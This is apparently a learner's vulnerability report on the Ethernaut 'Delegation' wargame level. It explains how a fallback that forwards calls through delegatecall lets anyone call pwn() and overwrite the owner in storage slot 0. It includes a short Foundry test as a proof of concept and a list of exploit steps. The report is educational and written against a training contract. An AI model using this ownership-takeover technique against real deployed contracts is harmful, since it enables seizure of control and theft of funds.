# 🎯 Vulnerability Report: Delegation (Ethernaut #6)

## 🔓 Vulnerability  
- **Type**: Insecure Delegatecall
- **Location**: Fallback function in Delegation contract  
- **Root Cause**:  
  The contract blindly forwards all calls to the Delegate contract using `delegatecall`, allowing attackers to execute arbitrary functions in the context of the Delegation contract's storage.

## Example:

The Scenario (Like a Bank Safe)
Imagine:

Delegate contract = A bank safe with a "Change Owner" button inside

Delegation contract = A reception desk that forwards any request to the safe

Normally, only the safe's owner can press the "Change Owner" button. But the reception desk has a special feature - any request you give it gets passed directly to the safe as if it came from the desk itself.

```js
// Create the safe (Delegate)
delegate = new Delegate(address(0));

// Create the reception desk (Delegation) that forwards to the safe
delegation = new Delegation(address(delegate));
// We walk up to the reception desk as an attacker
vm.prank(attacker);

// We say "Please press the Change Owner button"
// The desk forwards this to the safe, but the safe thinks the request 
// is coming from the desk itself (not us)
(bool success, ) = address(delegation).call(
    abi.encodeWithSignature("pwn()") // This means "call pwn() function"
);

// Now we check who the reception desk thinks is the owner
assertEq(delegation.owner(), attacker); // It's us!
```
## 🕵️‍♂️ How I Discovered It
1. **Analyzed the contracts**:
   - Noticed Delegation's fallback function forwards all calls via delegatecall
   - Saw storage layout matches between contracts (both have `owner` in slot 0)
   - Identified the `pwn()` function in Delegate that changes ownership

## 💥 Exploit Steps

1. **Prepare the attack**  
   - Create the function call data for `pwn()` (the ownership-changing function)

2. **Trigger the vulnerability**  
   - Send the `pwn()` call to the Delegation contract
   - This activates the fallback function that forwards everything via `delegatecall`

3. **Take control**  
   - The forwarded call executes in Delegation's context
   - The `owner` variable gets overwritten (storage slot 0)

4. **Verify success**  
   - Check that our address is now the contract owner
   - This confirms the storage was modified through the delegatecall
  
